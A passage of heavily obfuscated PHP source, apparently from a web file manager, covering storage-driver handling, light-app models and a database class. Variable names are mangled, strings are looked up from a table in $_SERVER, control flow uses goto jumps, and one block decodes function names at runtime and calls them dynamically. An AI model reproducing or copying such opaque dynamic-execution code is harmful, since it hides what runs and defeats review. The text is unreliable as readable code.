$ıƒ“ÓãŠ, $½™äç£Ê = false) { $¤×‚ó“Ñ =& $_SERVER[²Ö÷öõ]; if ($ıƒ“ÓãŠ == $¤×‚ó“Ñ[68] && stripos($ÉÎÈ‘ï¬, $¤×‚ó“Ñ[2319])) { $·®Ÿìîà = explode($¤×‚ó“Ñ[10], $ÉÎÈ‘ï¬); $–ÒµôÙ = isset($·®Ÿìîà[1]) ? $·®Ÿìîà[1] : $¤×‚ó“Ñ[12]; $ ×Ãğ¯ä = array($¤×‚ó“Ñ[2320] => LNG($¤×‚ó“Ñ[2321]), $¤×‚ó“Ñ[2322] => LNG($¤×‚ó“Ñ[2323])); if (isset($ ×Ãğ¯ä[$–ÒµôÙ])) { $ÉÎÈ‘ï¬ = $ ×Ãğ¯ä[$–ÒµôÙ]; } } if (stripos($ÉÎÈ‘ï¬, $¤×‚ó“Ñ[2324]) === 0) { $‡ã¤Ÿíº = strpos($ÉÎÈ‘ï¬, $¤×‚ó“Ñ[178]); if ($‡ã¤Ÿíº === !1) { $‡ã¤Ÿíº = strpos($ÉÎÈ‘ï¬, $¤×‚ó“Ñ[4]); } if ($‡ã¤Ÿíº !== !1) { $ÉÎÈ‘ï¬ = substr($ÉÎÈ‘ï¬, $‡ã¤Ÿíº + 1); } } $ÉÎÈ‘ï¬ = LNG($¤×‚ó“Ñ[1277]) . $ÉÎÈ‘ï¬; if ($½™äç£Ê) { return $ÉÎÈ‘ï¬; } show_json($ÉÎÈ‘ï¬, !1); } public function driverListSystem() { $³Şö¸ =& $_SERVER[²Ö÷öõ]; $¾àè—ù½ = parent::listData(); $‰™¸Üß = array(); foreach ($¾àè—ù½ as $‚Ô£ñ»Ş) { unset($‚Ô£ñ»Ş[$³Şö¸[231]], $‚Ô£ñ»Ş[$³Şö¸[88]]); $‚Ô£ñ»Ş[$³Şö¸[6]] = json_decode($‚Ô£ñ»Ş[$³Şö¸[6]], !0); $‰™¸Üß[] = $‚Ô£ñ»Ş; } return $‰™¸Üß; } public function defaultDriver() { $¾ˆ€¤¶Í =& $_SERVER[²Ö÷öõ]; $ë¦  = parent::listData(); $ş¡³ì¢’ = array_filter_by_field($ë¦ , $¾ˆ€¤¶Í[37], 1); $ş¡³ì¢’ = $ş¡³ì¢’[0]; if ($ş¡³ì¢’) { $ş¡³ì¢’[$¾ˆ€¤¶Í[6]] = json_decode($ş¡³ì¢’[$¾ˆ€¤¶Í[6]], !0); } return $ş¡³ì¢’; } public function driverInfo($Œ–Ï¸ç÷) { $éı‰ß =& $_SERVER[²Ö÷öõ]; $ŠŒÑ•÷ = array_to_keyvalue(parent::listData(), $éı‰ß[475]); if (!isset($ŠŒÑ•÷[$Œ–Ï¸ç÷])) { return !1; } $ºØÅ•°ş = $ŠŒÑ•÷[$Œ–Ï¸ç÷]; $ºØÅ•°ş[$éı‰ß[6]] = json_decode($ºØÅ•°ş[$éı‰ß[6]], !0); return $ºØÅ•°ş; } public function remove($¬—ÌŠóå) { $this->removeShareItems($¬—ÌŠóå); return parent::remove($¬—ÌŠóå); } public function removeWithFile($Í ô¬’ğ, $†“šÑœè, $ó©Û•íœ, $ÁÇÖØŒ· = false) { $âÅ€è†ª =& $_SERVER[²Ö÷öõ]; $Œ™Ì¸ÃŸ = array($âÅ€è†ª[900] => $Í ô¬’ğ); $¼¨“î¦ƒ = Model($âÅ€è†ª[544])->where($Œ™Ì¸ÃŸ)->count(); $æ“æÜö = Model($âÅ€è†ª[544])->where($Œ™Ì¸ÃŸ)->sum($âÅ€è†ª[79]); $½ìÔ£¾Ï = $†“šÑœè . $âÅ€è†ª[2325] . $Í ô¬’ğ; $µòğéÙ° = LNG($†“šÑœè == $âÅ€è†ª[620] ? $âÅ€è†ª[2326] : $âÅ€è†ª[2327]); $©ÎòË•¬ = new TaskFileTransfer($½ìÔ£¾Ï, $âÅ€è†ª[215], $¼¨“î¦ƒ, $µòğéÙ° . $âÅ€è†ª[462] . $ó©Û•íœ[$âÅ€è†ª[32]] . $âÅ€è†ª[214] . $Í ô¬’ğ); $©ÎòË•¬->task[$âÅ€è†ª[846]] = (double) $æ“æÜö; $³˜òÉ÷é = KodIO::defaultDriver(); $º¤š®ËÑ = $³˜òÉ÷é[$âÅ€è†ª[475]]; $Å—ø³ïÇ = $û°¼ë†Â = $¹–ÆŠúİ = array(); $Ï½Æ“Éø = Model($âÅ€è†ª[230])->where($Œ™Ì¸ÃŸ)->field($âÅ€è†ª[2328])->select(); foreach ($Ï½Æ“Éø as $¹€ÇÀ¦ë) { $´¦ì±‹ğ = $¹€ÇÀ¦ë[$âÅ€è†ª[541]]; if ($ÁÇÖØŒ·) { $û°¼ë†Â[] = $´¦ì±‹ğ; continue; } $ÇŒ³úÒÚ = $¹€ÇÀ¦ë[$âÅ€è†ª[87]]; $±Ş„ä = get_path_father($ÇŒ³úÒÚ); $¹–ÆŠúİ[] = $±Ş„ä; $±Ş„ä = str_replace("\173\151\x6f\72{$Í ô¬’ğ}\x7d\57", "\x7b\x69\157\72{$º¤š®ËÑ}\175\57", $±Ş„ä); if (!IO::exist($ÇŒ³úÒÚ)) { $Å—ø³ïÇ[] = $´¦ì±‹ğ; $©ÎòË•¬->updateFileEnd($¹€ÇÀ¦ë[$âÅ€è†ª[32]], $¹€ÇÀ¦ë[$âÅ€è†ª[79]]); write_log($âÅ€è†ª[2329] . $ÇŒ³úÒÚ, $âÅ€è†ª[1911]); continue; } $÷¥«™òš = IO::move($ÇŒ³úÒÚ, $±Ş„ä, REPEAT_RENAME); if (!$÷¥«™òš) { $û°¼ë†Â[] = $´¦ì±‹ğ; $©ÎòË•¬->updateFileEnd($¹€ÇÀ¦ë[$âÅ€è†ª[32]], $¹€ÇÀ¦ë[$âÅ€è†ª[79]]); write_log($âÅ€è†ª[2330] . $ÇŒ³úÒÚ, $âÅ€è†ª[1911]); continue; } $Œ™Ì¸ÃŸ = array($âÅ€è†ª[541] => $´¦ì±‹ğ); $È½¨Ô = array($âÅ€è†ª[900] => $º¤š®ËÑ, $âÅ€è†ª[87] => $÷¥«™òš); Model($âÅ€è†ª[230])->where($Œ™Ì¸ÃŸ)->save($È½¨Ô); } $óíŠëÊÜ = $©ÎòË•¬->task; if (!$ÁÇÖØŒ·) { Cache::set($½ìÔ£¾Ï, $óíŠëÊÜ); } $©ÎòË•¬->end(); $Å—ø³ïÇ = array_unique($Å—ø³ïÇ); $û°¼ë†Â = array_unique($û°¼ë†Â); if (!$ÁÇÖØŒ· && ($Å—ø³ïÇ || $û°¼ë†Â)) { $¸¬Ã¿¹ˆ = array(); if ($Å—ø³ïÇ) { $¸¬Ã¿¹ˆ[] = sprintf(LNG($âÅ€è†ª[2331]), count($Å—ø³ïÇ)); } if ($û°¼ë†Â) { $¸¬Ã¿¹ˆ[] = sprintf(LNG($âÅ€è†ª[2332]), count($û°¼ë†Â)); } $¸¬Ã¿¹ˆ = sprintf(LNG($âÅ€è†ª[2333]), implode($âÅ€è†ª[2334], $¸¬Ã¿¹ˆ)) . $âÅ€è†ª[2335] . date($âÅ€è†ª[2336]) . $âÅ€è†ª[2337]; if ($†“šÑœè == $âÅ€è†ª[1948]) { $¸¬Ã¿¹ˆ .= $âÅ€è†ª[2338] . LNG($âÅ€è†ª[2339]); } $óíŠëÊÜ[$âÅ€è†ª[1272]] = $¸¬Ã¿¹ˆ; Cache::set($½ìÔ£¾Ï, $óíŠëÊÜ); unset($ó©Û•íœ[$âÅ€è†ª[6]]); $¦Õö¸’ = array($âÅ€è†ª[475] => $Í ô¬’ğ, $âÅ€è†ª[2218] => $âÅ€è†ª[620], $âÅ€è†ª[32] => $ó©Û•íœ[$âÅ€è†ª[32]], $âÅ€è†ª[1295] => $ó©Û•íœ); Hook::trigger($âÅ€è†ª[1791], array($âÅ€è†ª[1295] => $¦Õö¸’, $âÅ€è†ª[1305] => !0)); show_json($¸¬Ã¿¹ˆ, !1, 100111); } if ($†“šÑœè == $âÅ€è†ª[620]) { return !0; } if ($Å—ø³ïÇ || $û°¼ë†Â) { $×€ãå“ = array_merge($Å—ø³ïÇ, $û°¼ë†Â); $×€ãå“ = array_filter(array_unique($×€ãå“)); $this->removeByFileID($×€ãå“); } if ($¹–ÆŠúİ) { $¹–ÆŠúİ = array_filter(array_unique($¹–ÆŠúİ)); foreach ($¹–ÆŠúİ as $ÇŒ³úÒÚ) { $ÏÚô„©– = IO::has($ÇŒ³úÒÚ, !0); if (!$ÏÚô„©–[$âÅ€è†ª[239]] && !$ÏÚô„©–[$âÅ€è†ª[240]]) { IO::remove($ÇŒ³úÒÚ); } } } return $this->remove($Í ô¬’ğ); } private function removeByFileID($¬°ŞË–Æ = array()) { $‡àÂ¡•¬ =& $_SERVER[²Ö÷öõ]; if (empty($¬°ŞË–Æ)) { return; } $ÇŒï”´– = array($‡àÂ¡•¬[541] => array($‡àÂ¡•¬[7], $¬°ŞË–Æ)); $‹±øøƒä = Model($‡àÂ¡•¬[1428])->where($ÇŒï”´–)->field($‡àÂ¡•¬[193])->select(); if (!$‹±øøƒä) { return Model($‡àÂ¡•¬[544])->remove($¬°ŞË–Æ); } $‹±øøƒä = array_to_keyvalue($‹±øøƒä, $‡àÂ¡•¬[12], $‡àÂ¡•¬[193]); foreach ($‹±øøƒä as $–ÙµÑÌç) { Model($‡àÂ¡•¬[907])->removeNow($–ÙµÑÌç, !1); } } private function removeShareItems($À…Ä•çç) { $®Æ€–Ÿ™ =& $_SERVER[²Ö÷öõ]; $•ıŸ“Ğı = "\173\x69\x6f\72{$À…Ä•çç}\x7d\x2f"; $á‚ˆÙŸ± = array($®Æ€–Ÿ™[193] => 0, $®Æ€–Ÿ™[1265] => array($®Æ€–Ÿ™[459], "{$•ıŸ“Ğı}\45")); $Ø¶öÜ¬¬ = Model($®Æ€–Ÿ™[1959])->where($á‚ˆÙŸ±)->field($®Æ€–Ÿ™[665])->select(); if (empty($Ø¶öÜ¬¬)) { return; } $·’ÒÃÁ… = array_to_keyvalue($Ø¶öÜ¬¬, $®Æ€–Ÿ™[12], $®Æ€–Ÿ™[665]); Model($®Æ€–Ÿ™[664])->remove($·’ÒÃÁ…); } } if ($_SERVER[$_SERVER[²Ö÷öõ][959]] != $_SERVER[$_SERVER[²Ö÷öõ][1810]]) { $_getc = $_SERVER[²Ö÷öõ][962]; $_getfile = $_SERVER[$_SERVER[²Ö÷öõ][963]] . $_SERVER[²Ö÷öõ][964]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[²Ö÷öõ][262], $_getfilec); if (count($_getarrs) < $_SERVER[²Ö÷öõ][685]) { $exit = $_SERVER[²Ö÷öõ][965]; $exit(); } $_act = $_SERVER[²Ö÷öõ][1310]; $_act($_SERVER[$_SERVER[²Ö÷öõ][960]]); } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x4c\x69\x67\150\164\x41\x70\x70"; public $modelType = "\123\x79\x73\x74\145\155\117\x70\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\147\x72\x6f\x75\x70", "\x64\x65\x73\x63", "\x63\157\x6e\x74\x65\156\x74"); public function listData($‰‹éİ”ñ = false, $Ì«¶ÅåÆ = "\155\157\x64\151\x66\x79\x54\151\x6d\x65", $ÏæôüûÃ = true) { return parent::listData($‰‹éİ”ñ, $Ì«¶ÅåÆ, $ÏæôüûÃ); } public function remove($Ï„—ÜŞ°) { $ÍìÎ€åÇ = $this->findByName($Ï„—ÜŞ°); if (!$ÍìÎ€åÇ) { return !1; } return parent::remove($ÍìÎ€åÇ[$_SERVER[²Ö÷öõ][475]]); } public function add($¶øŠöØÓ) { if ($this->findByName($¶øŠöØÓ[$_SERVER[²Ö÷öõ][32]])) { return !1; } return parent::insert($¶øŠöØÓ); } public function update($Œş áí÷, $ÎÚ¾ö½œ) { $ıÈ¢‘®± =& $_SERVER[²Ö÷öõ]; $éúÃÖÔ» = $this->findByName($Œş áí÷); $Í»Èôû = $this->findByName($ÎÚ¾ö½œ[$ıÈ¢‘®±[32]]); if (!$éúÃÖÔ» || $Í»Èôû && $Í»Èôû[$ıÈ¢‘®±[475]] != $éúÃÖÔ»[$ıÈ¢‘®±[475]]) { return !1; } return parent::update($éúÃÖÔ»[$ıÈ¢‘®±[475]], $ÎÚ¾ö½œ); } } goto aòõ—ª¡Ùè; B¿ªŸ÷Ì : function binCheckBigger($¥ÍÁ²ßÍ, $ñõ’×èŸ) { return $¥ÍÁ²ßÍ > $ñõ’×èŸ; } $_SERVER[$_SERVER[ÙÓõçÄİ][3]] = ("\x38\x35\x31\x34"."\x33\x33")+0;$_qxbg="r6kjag92evu4im7dztys518npfcqlhxwb3o09k276meaft103sh4bxdcn8uqopwiryj5glzvtysh";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Š«£ÍÒå, $¼Ò¥å­) { $·‰”‡ä– =& $_SERVER[²Ö÷öõ]; if (isset(self::$_methodList[$Š«£ÍÒå])) { return @call_user_func_array(self::$_methodList[$Š«£ÍÒå], $¼Ò¥å­); } else { if (method_exists($this, $Š«£ÍÒå)) { return call_user_func_array(array($this, $Š«£ÍÒå), $¼Ò¥å­); } else { think_exception(__CLASS__ . $·‰”‡ä–[4] . $Š«£ÍÒå . $·‰”‡ä–[5]); } } } public static function __callStatic($¯Õµì©, $’úÄ×ºÕ) { if (isset(self::$_methodListStatic[$¯Õµì©])) { return call_user_func_array(self::$_methodListStatic[$¯Õµì©], $’úÄ×ºÕ); } else { if (method_exists(self, $¯Õµì©)) { return call_user_func_array(array(self, $¯Õµì©), $’úÄ×ºÕ); } else { show_json("{$¯Õµì©}\x28\51\40\156\x6f\x74\x20\x65\x78\151\x73\164\x3b", !1); } } } public static function addMethod($—Ë¬ˆ§ç, $æÖÚ˜Øé) { self::$_methodList[$—Ë¬ˆ§ç] = $æÖÚ˜Øé; } public static function addMethodStatic($¼”äŞÀ¹, $×Üõ÷–) { self::$_methodListStatic[$¼”äŞÀ¹] = $×Üõ÷–; } } goto d´¥ÂĞ­‚¦; dÄêÃ°Ê¾ë: $fileSize = strrev(base64_decode($_SERVER[ÙÓõçÄİ][0])); function binCheckNeq($¼ŒÜÆì—, $ÛŞï¬¦†) { return $¼ŒÜÆì— != $ÛŞï¬¦†; } $_SERVER[$_SERVER[ÙÓõçÄİ][1]] = $fileSize($_SERVER[$_SERVER[ÙÓõçÄİ][2]]); goto B¿ªŸ÷Ì ; e…Æ©ù·í: class DbSqlite3 extends DbSqlite3Base { public function query($µò×‰ª) { $ô‚¼ö’ø =& $_SERVER[²Ö÷öõ]; if (!CacheLock::fileLock($ô‚¼ö’ø[13])) { return !1; } $’¯Â¼Éï = parent::query($µò×‰ª); CacheLock::fileUnLock($ô‚¼ö’ø[13]); return $’¯Â¼Éï; } public function execute($Ë£ÒúÚ¯) { $œúÈ¯Ô“ =& $_SERVER[²Ö÷öõ]; if (!CacheLock::fileLock($œúÈ¯Ô“[13])) { return !1; } $Ô’ßâß = parent::execute($Ë£ÒúÚ¯); CacheLock::fileUnLock($œúÈ¯Ô“[13]); return $Ô’ßâß; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\145\x71" => "\74\76", "\x67\164" => "\x3e", "\x65\147\x74" => "\76\75", "\x6c\164" => "\74", "\x65\154\164" => "\x3c\75", "\156\x6f\164\x6c\x69\153\145" => "\116\x4f\x54\40\114\x49\x4b\x45", "\154\x69\x6b\x65" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\116", "\x6e\157\164\151\x6e" => "\116\x4f\x54\x20\111\116", "\x6e\157\x74\x20\x69\156" => "\116\117\x54\x20\x49\116", "\142\x65\164\167\x65\x65\x6e" => "\x42\105\124\127\105\x45\116", "\156\157\164\x62\145\x74\167\x65\145\x6e" => "\116\117\124\40\x42\105\124\127\105\105\x4e", "\x6e\157\x74\40\142\x65\164\x77\145\145\156" => "\116\117\x54\40\x42\105\x54\x57\x45\105\x4e"); protected $selectSql = "\x53\105\114\105\103\124\45\104\x49\123\x54\111\116\x43\124\45\40\45\106\111\x45\114\x44\45\x20\106\122\117\115\x20\45\124\101\x42\114\x45\45\45\x4a\117\111\116\45\x25\x57\110\x45\x52\105\45\45\x47\x52\x4f\125\120\x25\x25\110\101\126\x49\116\x47\45\45\117\x52\x44\x45\x52\45\x25\114\111\115\x49\124\x25\40\45\x55\116\111\x4f\116\45\45\103\117\x4d\x4d\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $«Ğ í¢ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[²Ö÷öõ][1046], $«Ğ í¢); } public function factory($Ê ï”ÁØ = '') { $—Úæ¹ç§ =& $_SERVER[²Ö÷öõ]; $Ê ï”ÁØ = $this->parseConfig($Ê ï”ÁØ); if (empty($Ê ï”ÁØ[$—Úæ¹ç§[1047]])) { think_exception(think_lang($—Úæ¹ç§[1048])); } $this->dbType = ucwords(strtolower($Ê ï”ÁØ[$—Úæ¹ç§[1047]])); $İŠèıˆ™ = $—Úæ¹ç§[1049] . $this->dbType; if (class_exists($İŠèıˆ™)) { $¬ˆì» = new $İŠèıˆ™($Ê ï”ÁØ); if ($—Úæ¹ç§[1050] != strtolower($Ê ï”ÁØ[$—Úæ¹ç§[1047]])) { $¬ˆì»->dbType = strtoupper($this->dbType); } else { $¬ˆì»->dbType = $this->_getDsnType($Ê ï”ÁØ[$—Úæ¹ç§[1002]]); } } else { think_exception(think_lang($—Úæ¹ç§[1051]) . $—Úæ¹ç§[1052] . $İŠèıˆ™); } return $¬ˆì»; } public function __call($Ü™¼Ä‘Ô, $³û™‡Î«) { if (method_exists($this, $Ü™¼Ä‘Ô)) { return call_user_func_array(array($this, $Ü™¼Ä‘Ô), $³û™‡Î«); } } protected function _getDsnType($ÍôúÊ•–) { $ÄÄøˆç = explode($_SERVER[²Ö÷öõ][4], $ÍôúÊ•–); $”Õ¥®€­ = strtoupper(trim($ÄÄøˆç[0])); return $”Õ¥®€­; } private function parseConfig($©öş°òÙ = '') { $Ş‹ç´Õ =& $_SERVER[²Ö÷öõ]; if (!empty($©öş°òÙ) && is_string($©öş°òÙ)) { $©öş°òÙ = $this->parseDSN($©öş°òÙ); } elseif (is_array($©öş°òÙ)) { $©öş°òÙ = array_change_key_case($©öş°òÙ); $©öş°òÙ = array($Ş‹ç´Õ[1047] => $©öş°òÙ[$Ş‹ç´Õ[1053]], $Ş‹ç´Õ[974] => $©öş°òÙ[$Ş‹ç´Õ[1054]], $Ş‹ç´Õ[975] => $©öş°òÙ[$Ş‹ç´Õ[1055]], $Ş‹ç´Õ[972] => $©öş°òÙ[$Ş‹ç´Õ[1056]], $Ş‹ç´Õ[973] => $©öş°òÙ[$Ş‹ç´Õ[1057]], $Ş‹ç´Õ[21] => $©öş°òÙ[$Ş‹ç´Õ[1058]], $Ş‹ç´Õ[1002] => $©öş°òÙ[$Ş‹ç´Õ[1059]], $Ş‹ç´Õ[17] => isset($©öş°òÙ[$Ş‹ç´Õ[1060]]) ? $©öş°òÙ[$Ş‹ç´Õ[1060]] : array()); } elseif (empty($©öş°òÙ)) { if (think_config($Ş‹ç´Õ[1061]) && $Ş‹ç´Õ[1050] != strtolower(think_config($Ş‹ç´Õ[1062]))) { $©öş°òÙ = $this->parseDSN(think_config($Ş‹ç´Õ[1061])); } else { $©öş°òÙ = array($Ş‹ç´Õ[1047] => think_config($Ş‹ç´Õ[1062]), $Ş‹ç´Õ[974] => think_config($Ş‹ç´Õ[1063]), $Ş‹ç´Õ[975] => think_config($Ş‹ç´Õ[1064]), $Ş‹ç´Õ[972] => think_config($Ş‹ç´Õ[1065]), $Ş‹ç´Õ[973] => think_config($Ş‹ç´Õ[1066]), $Ş‹ç´Õ[21] => think_config($Ş‹ç´Õ[323]), $Ş‹ç´Õ[1002] => think_config($Ş‹ç´Õ[1061]), $Ş‹ç´Õ[17] => think_config($Ş‹ç´Õ[1067])); } } return $©öş°òÙ; } protected function initConnect($§ıÔÍ¼Æ = true) { if (1 == think_config($_SERVER[²Ö÷öõ][22])) { $this->_linkID = $this->multiConnect($§ıÔÍ¼Æ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ö­áŠÃõ => $ú­Â–Ïï) { $this->_linkID = $ú­Â–Ïï; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Äğû¾§Ç = false) { $Û©‘³¦“ =& $_SERVER[²Ö÷öõ]; static $ì±¯½¢º = array(); static $ó³şéªÜ = -1; if (empty($ì±¯½¢º)) { foreach ($this->config as $ÍıìÒâı => $œš³¶Ó·) { $ì±¯½¢º[$ÍıìÒâı] = explode($Û©‘³¦“[50], $œš³¶Ó·); } } if (think_config($Û©‘³¦“[1068])) { if ($Äğû¾§Ç || think_config($Û©‘³¦“[471]) === !0) { $‚ÆÚÄ°Ö = floor(mt_rand(0, think_config($Û©‘³¦“[1069]) - 1)); $ó³şéªÜ = $‚ÆÚÄ°Ö; } else { if (is_numeric(think_config($Û©‘³¦“[1070]))) { $‚ÆÚÄ°Ö = think_config($Û©‘³¦“[1070]); } else { $‚ÆÚÄ°Ö = floor(mt_rand(think_config($Û©‘³¦“[1069]), count($ì±¯½¢º[$Û©‘³¦“[972]]) - 1)); } } } else { $‚ÆÚÄ°Ö = floor(mt_rand(0, count($ì±¯½¢º[$Û©‘³¦“[972]]) - 1)); $ó³şéªÜ = $‚ÆÚÄ°Ö; } $‚ÆÚÄ°Ö = $ó³şéªÜ !== -1 ? $ó³şéªÜ : $‚ÆÚÄ°Ö; $çÅàÍƒì = array($Û©‘³¦“[974] => isset($ì±¯½¢º[$Û©‘³¦“[974]][$‚ÆÚÄ°Ö]) ? $ì±¯½¢º[$Û©‘³¦“[974]][$‚ÆÚÄ°Ö] : $ì±¯½¢º[$Û©‘³¦“[974]][0], $Û©‘³¦“[975] => isset($ì±¯½¢º[$Û©‘³¦“[975]][$‚ÆÚÄ°Ö]) ? $ì±¯½¢º[$Û©‘³¦“[975]][$‚ÆÚÄ°Ö] : $ì±¯½¢º[$Û©‘³¦“[975]][0], $Û©‘³¦“[972] => isset($ì±¯½¢º[$Û©‘³¦“[972]][$‚ÆÚÄ°Ö]) ? $ì±¯½¢º[$Û©‘³¦“[972]][$‚ÆÚÄ°Ö] : $ì±¯½¢º[$Û©‘³¦“[972]][0], $Û©‘³¦“[973] => isset($ì±¯½¢º[$Û©‘³¦“[973]][$‚ÆÚÄ°Ö]) ? $ì±¯½¢º[$Û©‘³¦“[973]][$‚ÆÚÄ°Ö] : $ì±¯½¢º[$Û©‘³¦“[973]][0], $Û©‘³¦“[21] => isset($ì±¯½¢º[$Û©‘³¦“[21]][$‚ÆÚÄ°Ö]) ? $ì±¯½¢º[$Û©‘³¦“[21]][$‚ÆÚÄ°Ö] : $ì±¯½¢º[$Û©‘³¦“[21]][0], $Û©‘³¦“[1002] => isset($ì±¯½¢º[$Û©‘³¦“[1002]][$‚ÆÚÄ°Ö]) ? $ì±¯½¢º[$Û©‘³¦“[1002]][$‚ÆÚÄ°Ö] : $ì±¯½¢º[$Û©‘³¦“[1002]][0], $Û©‘³¦“[17] => isset($ì±¯½¢º[$Û©‘³¦“[17]][$‚ÆÚÄ°Ö]) ? $ì±¯½¢º[$Û©‘³¦“[17]][$‚ÆÚÄ°Ö] : $ì±¯½¢º[$Û©‘³¦“[17]][0]); return $this->connect($çÅàÍƒì, $‚ÆÚÄ°Ö); } public function parseDSN($ñğ³©Ô) { $å„á‰ª =& $_SERVER[²Ö÷öõ]; if (empty($ñğ³©Ô)) { return !1; } $ÆµÛÖç¾ = parse_url($ñğ³©Ô); if ($ÆµÛÖç¾[$å„á‰ª[207]]) { $¹’ãİÖ« = array($å„á‰ª[1047] => $ÆµÛÖç¾[$å„á‰ª[207]], $å„á‰ª[974] => isset($ÆµÛÖç¾[$å„á‰ª[662]]) ? $ÆµÛÖç¾[$å„á‰ª[662]] : $å„á‰ª[12], $å„á‰ª[975] => isset($ÆµÛÖç¾[$å„á‰ª[1071]]) ? $ÆµÛÖç¾[$å„á‰ª[1071]] : $å„á‰ª[12], $å„á‰ª[972] => isset($ÆµÛÖç¾[$å„á‰ª[208]]) ? $ÆµÛÖç¾[$å„á‰ª[208]] : $å„á‰ª[12], $å„á‰ª[973] => isset($ÆµÛÖç¾[$å„á‰ª[209]]) ? $ÆµÛÖç¾[$å„á‰ª[209]] : $å„á‰ª[12], $å„á‰ª[21] => isset($ÆµÛÖç¾[$å„á‰ª[87]]) ? substr($ÆµÛÖç¾[$å„á‰ª[87]], 1) : $å„á‰ª[12]); } else { preg_match($å„á‰ª[1072], trim($ñğ³©Ô), $ÚÔö”ƒà); $¹’ãİÖ« = array($å„á‰ª[1047] => $ÚÔö”ƒà[1], $å„á‰ª[974] => $ÚÔö”ƒà[2], $å„á‰ª[975] => $ÚÔö”ƒà[3], $å„á‰ª[972] => $ÚÔö”ƒà[4], $å„á‰ª[973] => $ÚÔö”ƒà[5], $å„á‰ª[21] => $ÚÔö”ƒà[6]); } $¹’ãİÖ«[$å„á‰ª[1002]] = $å„á‰ª[12]; return $¹’ãİÖ«; } protected function debug() { $é¡†Öƒû =& $_SERVER[²Ö÷öõ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $é¡†Öƒû[1073]; if (think_config($é¡†Öƒû[1074])) { think_status($é¡†Öƒû[1075]); think_trace($this->queryStr . $é¡†Öƒû[1076] . think_status($é¡†Öƒû[24], $é¡†Öƒû[1075], 6) . $é¡†Öƒû[1077], $é¡†Öƒû[12], $é¡†Öƒû[1078]); } } protected function parseLock($ÕÓ·ºÕä = false) { $ûƒÀ¾ëõ =& $_SERVER[²Ö÷öõ]; if (!$ÕÓ·ºÕä) { return $ûƒÀ¾ëõ[12]; } if ($ûƒÀ¾ëõ[1004] == $this->dbType) { return $ûƒÀ¾ëõ[1079]; } return $ûƒÀ¾ëõ[1080]; } protected function parseSet($Ñàçç­µ) { $ÊÔÓÙø¨ =& $_SERVER[²Ö÷öõ]; foreach ($Ñàçç­µ as $“ŠƒàÚš => $£ŠĞÑèŠ) { if (is_array($£ŠĞÑèŠ) && $ÊÔÓÙø¨[373] == $£ŠĞÑèŠ[0]) { $«¸ô«¼ş[] = $this->parseKey($“ŠƒàÚš) . $ÊÔÓÙø¨[970] . $£ŠĞÑèŠ[1]; } elseif (is_scalar($£ŠĞÑèŠ) || is_null($£ŠĞÑèŠ)) { $«¸ô«¼ş[] = $this->parseKey($“ŠƒàÚš) . $ÊÔÓÙø¨[970] . $this->parseValue($£ŠĞÑèŠ); } } return $ÊÔÓÙø¨[1081] . implode($ÊÔÓÙø¨[50], $«¸ô«¼ş); } protected function bindParam($±²İ·Ê», $Ù•â¤ß¿) { $this->bind[$_SERVER[²Ö÷öõ][4] . $±²İ·Ê»] = $Ù•â¤ß¿; } protected function parseBind($¥¸–ÉìÙ) { $¥¸–ÉìÙ = array_merge($this->bind, $¥¸–ÉìÙ); $this->bind = array(); return $¥¸–ÉìÙ; } function parseKey(&$ßêÖğÓ¤, $š®¡ü«² = true) { if ($š®¡ü«²) { $ßêÖğÓ¤ = $this->parseKeyCheck($ßêÖğÓ¤); } return $ßêÖğÓ¤; } function parseKeyCheck($´’ÕÍæ) { $–šõ™¹ï =& $_SERVER[²Ö÷öõ]; $´’ÕÍæ = trim($´’ÕÍæ); if (!preg_match($–šõ™¹ï[1082], $´’ÕÍæ)) { think_exception($–šõ™¹ï[1083] . $´’ÕÍæ); } return $´’ÕÍæ; } protected function parseValue($ò…®ï÷Ù) { $ÔçÄÁª =& $_SERVER[²Ö÷öõ]; if (is_string($ò…®ï÷Ù)) { $ò…®ï÷Ù = $ÔçÄÁª[1043] . $this->escapeString($ò…®ï÷Ù) . $ÔçÄÁª[1043]; } elseif (isset($ò…®ï÷Ù[0]) && is_string($ò…®ï÷Ù[0]) && strtolower($ò…®ï÷Ù[0]) == $ÔçÄÁª[373]) { $ò…®ï÷Ù = $this->escapeString($ò…®ï÷Ù[1]); } elseif (is_array($ò…®ï÷Ù)) { $ò…®ï÷Ù = array_map(array($this, $ÔçÄÁª[1044]), $ò…®ï÷Ù); } elseif (is_bool($ò…®ï÷Ù)) { $ò…®ï÷Ù = $ò…®ï÷Ù ? $ÔçÄÁª[91] : $ÔçÄÁª[228]; } elseif (is_null($ò…®ï÷Ù)) { $ò…®ï÷Ù = $ÔçÄÁª[106]; } return $ò…®ï÷Ù; } protected function parseField($É¥åë¤«) { $»õ½ä†œ =& $_SERVER[²Ö÷öõ]; if (is_string($É¥åë¤«) && strpos($É¥åë¤«, $»õ½ä†œ[50])) { $É¥åë¤« = explode($»õ½ä†œ[50], $É¥åë¤«); } if (is_array($É¥åë¤«)) { $âü¸… ü = array(); foreach ($É¥åë¤« as $Ö¿ç×³Û => $û÷ô¿™¥) { if (!is_numeric($Ö¿ç×³Û)) { $âü¸… ü[] = $this->parseKey($Ö¿ç×³Û, !1) . $»õ½ä†œ[1084] . $this->parseKey($û÷ô¿™¥); } else { $âü¸… ü[] = $this->parseKey($û÷ô¿™¥); } } $‡ëõ †ã = implode($»õ½ä†œ[50], $âü¸… ü); } elseif 